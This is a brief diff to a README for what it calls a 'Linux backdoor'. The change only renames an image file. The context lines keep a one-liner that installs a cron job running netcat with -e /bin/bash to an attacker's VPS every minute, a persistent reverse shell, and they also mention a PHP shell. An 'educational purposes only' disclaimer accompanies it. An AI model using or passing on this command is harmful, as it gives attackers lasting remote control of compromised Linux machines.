@@ -9,7 +9,7 @@ Linux  backdoor
 * echo "*/1 * * * *  nc your_vps_public_IP the_port_for_netcat  -e /bin/bash   > /dev/null 2>&1 &" > cron && cat cron | crontab -
 * This is for php shell:
 
-![alt image](php_shell.png)
+![alt image](php.png)
 
 ### Only for educational purposes!
 ### Use it on your own server!
